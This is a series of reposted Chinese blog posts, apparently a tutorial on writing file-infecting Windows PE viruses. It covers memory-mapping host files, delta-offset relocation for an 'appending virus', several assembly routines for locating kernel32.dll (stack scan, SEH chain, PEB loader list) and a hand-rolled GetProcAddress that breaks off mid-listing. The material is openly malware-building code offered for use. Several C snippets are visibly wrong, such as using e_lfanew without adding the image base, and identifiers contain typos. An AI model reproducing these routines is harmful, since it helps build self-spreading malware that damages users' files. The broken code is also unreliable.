
本文来自 CSDN 博客，转载请标明出处：`http://blog.csdn.net/yangbostar/archive/2010/09/19/5894360.aspx`

对 PE 文件结构的各个值定义和作用，这里不提了，网上资源很多，百度一下就好了。所以，本章只说一下，作为代码编写者对 PE 文件结构操作的方法和技巧。

还是通过改进代码，来体会一下吧。

你应该记得前面的 `BOOL IsPEFile(HANDLE hFIle)` 这个函数吧，它的作用是判断文件是否为 PE 格式文件。它把文件句柄作为参数，虽然许多函数需要文件句柄这个参数，但是作为对 PE 文件结构操作的函数，这样做是不恰当的，因为如果这样做就要频繁的使用 `SetFilePointer()`、`ReadFile()`、`WriteFile()`。假若以文件指针作为参数，那么这一类关于 PE 结构文件操作的代码，将大大简化。

举例：

```
BOOL IsPEFile(LPVOID ImageBase)
{
  PIMAGE_DOS_HEADER pDosHeader=NULL;
  PIMAGE_NT_HEADERS32 pNtHeaders=NULL;

//指针安全检查
  if(!ImageBase)
    return FALSE;

//dos 头检查
  pDosHeader=(PIMAGE_DOS_HEADER)ImageBase;
  if(pDosHeader->e_magic!=IMAGE_DOS_SIGNATURE)
    return FALSE;

//NT 文件头检查
  pNtHeaders=(PIMAGE_NT_HEADERS32)pDosHeader->e_lfanew;
  if(pNtHeaders->Signauture!=IMAGE_NT_SIGNATURE)
    return FALSE;

  return TRUE;
}
```

当然为了使文件以指针传入，需要将其映射到内存中，并且由于许多函数需要文件句柄，所以原来的 `HANDLE OpenHostFile()` 需要改造。

```
typedef struct PEFileInformation//用这个名字是因为将来还要添加其他成员
{
  HANDLE hFile;
  HANLDE hMap;
  LPVOID ImageBase;
}INFORMATION_PE_FILE,*PINFORMATION_PE_FILE;

PINFORMATION_PE_FILE OpenHostFile(PINFORMATION_PE_FILE pFile,\
                                const WIN32_FIND_DATA *pHost,\
                                DWORD *nCount)
{
  pFile.hFile=CreateFile(pHost->cFileName,
        GENERIC_READ|GENERIC_WRITE,
        FILE_SHARE_READ|FILE_SHARE_WRITE,
        0,
        OPEN_EXISTING,
        NULL,
        NULL);
  if(pFile.hFile!=INVALID_HANDLE_VALUE)
  {
    pFile.hMap=CreateFileMapping(pFile.hFile,NULL,PAGE_READONLY,0,0,NULL);
    pFile.ImageBase=MapViewOfFile(pFile.hMap,FILE_MAP_WRITE |FILE_MAP_READ,\
                                 0,0,0,0);
    if(pFile.ImageBase!=NULL)
      (*nCount)++;
    else
      return NULL;
  }
  else
    return NULL;
  return pFile;
}
```

OK,估计真正你已经了解 PE 文件结构操作的方法，即以 DOS 头为起点，逐步通过指针偏移，扫描 PE 结构，以下是一些获取常用 PE 结构参考代码

//获取 NT 文件头
```
PIMAGE_NT_HEADERS32 GetNtHeaders(LPVOID ImageBase)
{
  PIMAGE_DOS_HEADER pDosHeader=NULL;
  PIMAGE_NT_HEADERS32 pNtHeaders=NULL;
  if(!ImageBase)
    return NULL;
  pDosHeader=(PIMAGE_DOS_HEADER)ImageBase;
  pNtHeaders=(PIMAGE_NT_HEADERS32)pDosHeader->e_lfanew;
  return  pNtHeaders;
}
```

//获取 PE 可选文件头
```
PIMAGE_OPTIONAL_HEADER GetOptionalHeader(LPVOID ImageBase)
{
  PIMAGE_NT_HEADERS32 pNtHeaders=NULL;
  pNtHeaders=GetNtHeaders(ImageBase);
  if(!pNtHeader)
     return NULL;
  else
     return &pNtHeaders->Header;
}
```

//获得区块表指针
```
PIMAGE_SECTION_HEADER GetSectionHeader(LPVOID ImageBase)
{
  return (PIMAGE_SECTION_HEADER)(GetOptionalHeader(ImageBase)+sizeof(IMAGE_OPTIONAL_HEADER));
}
```

PE 结构上还要许多重要的位置，用的时候以上面的函数为基点，编写自己的函数吧

本文来自 CSDN 博客，转载请标明出处：`http://blog.csdn.net/yangbostar/archive/2010/10/06/5924323.aspx`

### 1. 为何需要重定位？

病毒的生存空间就是宿主程序，而因为宿主程序的不同。所以病毒每次插入到宿主程序中的位置也不同。那么病毒需要用到的变量的位置就无法确定。所以这就是病毒首先要重定位的原因。在我们编写程序的时候，所用到的变量的位置都是相对与程序某一个位置的偏移，正常的程序加载的地址是唯一的，所以它们不需要重定位。而病毒的加载是随机的所以就有了重定位的过程。虽然加载的位置不一定，但是变量到某一个位置的偏移却是固定的。所以重定位的基本原理就是找到这个特殊的位置。具体的方法有很多种。这里说几种常见的。

前面介绍的“前置病毒”根本不需要重定位的，因为病毒写在病毒文件最前面，所以它的相对偏移和绝对偏移是相等的。

然而，从本章开始，我们要为名为“追加病毒”的病毒，做技术积累。因为该病毒将病毒体追加到病毒文件尾，它的相对偏移和绝对偏移显然是不相等的。

### 2. 常见的重定位错误写法

```
call Entry
Entry:
pop ebp
sub ebp,offset Entry
mov ImagePosition,ebp
```

其实这是一些关于计算机病毒教科书的故意错写的方法，然而相当多的人不亲自动手实践，人云亦云，造成迄今为止大量的错误代码的出现，和病毒编写入门困难。

### 3. 重定位正确写法和变体

```
start0:
...
start:
call Entry
...
Entry:
pop eax ;也可以用 MOV EXX，[ESP]代替 pop eax 取出栈顶的内容
sub eax,5 ;减 5 是定位 start 的位置，如果定位 start0 的位置可写为 sub eax,offset start- offset start0
```

本文来自 CSDN 博客，转载请标明出处：`http://blog.csdn.net/yangbostar/archive/2010/10/07/5925648.aspx`

由于大部分的文件感染型病毒框架都不可以像“前置病毒”那样拥有自己的输入表，因此需要自行定位 API

说一千道一万，想要定位 API，大方向是要定位 `Kernel32.dll` 的基地址。

总结所以这些方法，可以分为是五个小方向，它们又产生很多变种。

### 一、定位 `kernel32.dll` 基地址的方法

#### (1) 硬编码方式

由于 `kernel32.dll` 的基地址在相同版本 `windows` 下，基本上它的位置是固定的。这种方法在早期的 PE 病毒中很常见，现在已经很少使用了。

#### (2) 利用程序初始化时，首先寄存器或堆栈中保留的 `kernel32.dll` 内存模块中的某个地址，之后无论哪种变体，都是以这个 `kernel` 内的地址向前搜索，找到 `kernel.dll` 的基地址。

以下地方就存储着这些地址：

① 寄存器 `EDI`

② 刚刚初始化的堆栈：`[esp]`、`[esp+4H]`、`[esp+10H]`

以 `[esp+10h]` 为例，我们看一下参考代码(另外注释里有一些常见错误代码的写法):

```
Start:
  mov edx,[esp+10h]
SearchDosHeader:
  dec  edx
  xor  dx,dx                 ;加速搜索，因为 DLL 以 1M 长度对齐，所以这里以 64K 字节为跨度来加速搜索
  cmp word ptr[edx],'ZM'  ;不要自作聪明写成'MZ',那是以字节逐个读取的结果
                       ;，这里是以双字节读取的，'Z'在高位，'M'在低位,因此写为'ZM'
  jnz SearchDosHeader
IsNTHeaders:
  mov eax,[edx+3ch]       ;这里也不要写为[edx+IMAGE_NT_HEADERS32.Signatrue],这样不会得到想要的结果
  cmp word ptr [eax+edx],'EP' ;和'ZM'是一个道理
  jnz  SearchDosHeader
  mov KernelImageBase,edx ；KernelImageBase 是自定义局部变量，可以放在堆栈里
  ret
end Start
```

#### (3) 遍历 seh 异常链，然后获得 `EXCEPTION_REGISTRATION` 结构 `prev` 为 `-1` 的异常处理过程地址，这个异常处理过程地址是位于 `kernel32.dll` 中，通过它向前搜索得到 `kernel32.dll` 的基地址。

以下是参考代码：

```
Start
assume fs:nothing     ;Masm 默认是不使用 fs 寄存器的，写上这句话才能使用
  mov edx,[fs:0]         ;获得 EXCEPTION_REGISTRATION 结构地址
Next:
  inc   dword ptr [edx];将 prev 成员 + 1,判断是否为零，然后恢复
  jz     Kml
  dec  dword ptr [edx]
  mov edx,[edx]
  jmp  Next
Kml:
  dec  dword ptr [edx];恢复 -1
  mov edx,[edx+4]
SearchDosHeader:
  dec  edx
  xor  dx,dx
  cmp word ptr[edx],'ZM'
  jnz SearchDosHeader
IsNTHeaders:
  mov eax,[edx+3ch]
  cmp word ptr [eax+edx],'EP'
  jnz SearchDosHeader
  mov KernelImageBase,edx
  ret
end Start
```

#### (4) 通过 `TEB` 获得 `PEB` 结构地址，然后再获得 `PEB_LDR_DATA` 结构地址，然后遍历模块列表，查找 `kernel32.dll` 模块的基地址。

```
Start:
assume fs:nothing
  mov edx, [fs:30h]    ;Get Peb
  mov edx, [edx+0ch] ;Get _PEB_LDR_DATA
  mov edx, [edx+1ch] ;Get InInitializationOrderModuleList.Flink, 此时 eax 指向的是 ntdll 模块的
                                ;InInitializationOrderModuleList 线性地址。所以我们获得它的下一个则是 kernel32.dll
  mov edx, [edx]
  mov edx, [edx+8]    ; 8 = sizeof.LIST_ENTRY
  mov KernelImageBase,edx
  ret
end Start
```

#### (5) 一个正常的程序的输入表都会加载 `Kernel32.dll`，所以通过搜索宿主本身的输入表，再找到 `Kernel32.dll`，然后搜索它基地址。但是这个方法缺点首先是代码长度比较长，并且病毒首次编译后，其本身输入表不加载 `Kernel32.dll`，需要手工抽取代码，然后绑定到宿主程序上，这样病毒才算真正完成。

步骤：

1. 找到本程序的 PE 头文件，方法有三种：①利用默认文件内存加载点 `400000h` ②利用进程初始化堆栈的 `[esp+34h]` 保存的程序入口点，向前找到问 PE 文件头 ③重定位当前点，向前搜索
2. 再找到输入表、进而找到 `Kernel32.dll`，代码就不写了，一点也不难
3. 手工绑定，具体步骤请参考《Windows 应用程序捆绑核心编程》(张正秋著)第一版的第十一章。

### 二、通过自己实现的 `GetProcAddress` 定位 API

在 `Kernel32.dll` 中有 `GetProcAddress` 这个函数，它可以通过函数名定位函数入口地址。可是由于不知道 `GetProcAddress` 的地址，只好由我们自己实现，以下代码可供参考，如果对 PE 结构了解十分清楚，那么代码是很容易读懂的。

```
My_Get_API_Address proc Base:dword,sFunctionName:dword
LOCAL NumberOfName:dword
LOCAL AddressOfFunctions:dword
LOCAL AddressOfNames:dword
LOCAL AddressOfOrdinarls:dword
;定位输出表
  mov ebx,Base
  mov eax,[ebx+3ch]
  mov eax,[ebx+eax+78h]
  add eax,ebx
;取出输出表中一些有用的值
  mov  ebx,[eax+18h]
  mov  NumberOfName,ebx
  mov  ebx,[eax+1ch]
  add  ebx,Base
  mov  AddressOfFunctions,ebx
  mov  ebx,[eax+20h]
  add  ebx,Base
  mov  AddressOfNames,ebx
  mov  ebx,[eax+24h]
  add  ebx,Base
  mov  AddressOfOrdinarls,ebx
;根据函数名找出函数 ID
  xor eax,eax
  mov edi,AddressOfNames
  mov ecx,NumberOfName
  LoopNumberOfName:
        mov esi,sFunctionName
        push eax
        mov ebx,[edi]
        add ebx,Base
        Match_API:
          mov al,byte ptr[ebx]
          cmp al,[esi]
          jnz Not_Match
          or al,0h
          jz GetKernel_API_Index_Found
          inc ebx
          inc esi
          jmp Match_API
